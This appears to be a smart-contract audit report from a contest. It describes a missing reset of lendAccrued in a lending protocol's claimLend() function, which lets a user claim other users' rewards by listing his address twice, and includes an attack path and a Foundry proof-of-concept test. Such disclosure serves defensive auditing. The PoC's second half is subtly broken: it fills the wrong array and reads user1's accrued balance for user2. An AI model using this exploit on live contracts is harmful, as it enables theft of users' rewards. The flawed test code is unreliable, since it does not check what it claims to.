# Not clearing the lendAccrued will cause users to claim more than once

### Summary

Users can claim their accrued LEND rewards multiple times due to a missing state reset in the claimLend() function. After calling grantLendInternal() to transfer LEND tokens, the protocol fails to reset the user's lendAccrued balance to zero, allowing repeated claims of the same rewards.

### Root Cause

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L400
Getting the `lendAccrued` every time without resetting it will allow the attacker to claim rewards for other users.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

1. User1 and User2 supply tokens using `supply` in `CoreRouter.sol`, for example, 1000 tokens.
2. Now rewards arrive, for example, 0.1 lend token.
3. Each user will now have 0.05 rewards to claim.
4. Now, user1 calls `claimLend` passing his address 2 times in the `holders` parameter.
5. This will allow him to claim the entire reward, which is 0.1 Lend token. When user2 calls claim, he will get nothing since all the rewards have been transferred to user1.

### Impact

A user can claim rewards for other users by calling claimLend multiple times or passing his address multiple times.

### PoC

```solidity
function test_claiming_more() public {
        address lendToken = lendtroller.getLendAddress();
        // Supply different amounts with two users
        uint256 user1Supply = 1000e18;
        uint256 user2Supply = 1000e18;
        (, address lToken) = _supply(user1Supply, user1);
        _supply(user2Supply, user2);


        // Advance time
        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 1000);

        // Claim user1 and assert he will get more than he deserve
        address[] memory holders = new address[](2);
        holders[0] = user1;
        holders[1] = user1;
        LToken[] memory lTokenArray = new LToken[](1);
        lTokenArray[0] = LToken(lToken);
        vm.prank(user1);
        coreRouter.claimLend(holders, lTokenArray, false, true);
        uint256 lendAccrued = lendStorage.lendAccrued(user1);
        assertGt(IERC20(lendToken).balanceOf(user1),lendAccrued);

        //checking user2 will get nothing according to his lendAccured
        address[] memory holders_2 = new address[](1);
        holders[0] = user2;
        vm.prank(user2);
        coreRouter.claimLend(holders_2,lTokenArray,false,true);
        uint256 lendAccrued_user2 = lendStorage.lendAccrued(user1);
        assertLt(IERC20(lendToken).balanceOf(user2),lendAccrued_user2);
    }
```

### Mitigation

Clear the `lendAccrued` for every user after claiming their rewards.
